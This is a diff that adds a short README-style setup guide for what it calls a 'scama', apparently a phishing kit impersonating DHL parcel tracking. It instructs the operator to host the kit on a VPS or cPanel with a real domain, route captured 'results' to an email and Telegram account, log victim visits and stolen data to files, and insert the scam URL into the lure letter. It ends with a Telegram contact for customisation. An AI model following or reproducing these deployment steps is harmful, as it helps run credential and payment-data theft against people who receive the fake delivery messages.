@@ -1,0 +1,9 @@
+- scama don't work on free hosting
+- scama don't work on localhost you need upload to host or vps with a valid domain name
+- open file config.php and change your email and telegram infos
+- make shore folder _data_ is writable
+- file visit logs: _data_/logs.txt
+- file result logs: _data_/mydata.txt -> you can change file name in config.php ($_secure = "mydata";)
+- upload file dhl_2024.zip to cpanel or vps and unzip file
+- change url in letter with: https://www.domain.com/track/ (*example)
+- for any edit ontact me at telegram : b4dpixel
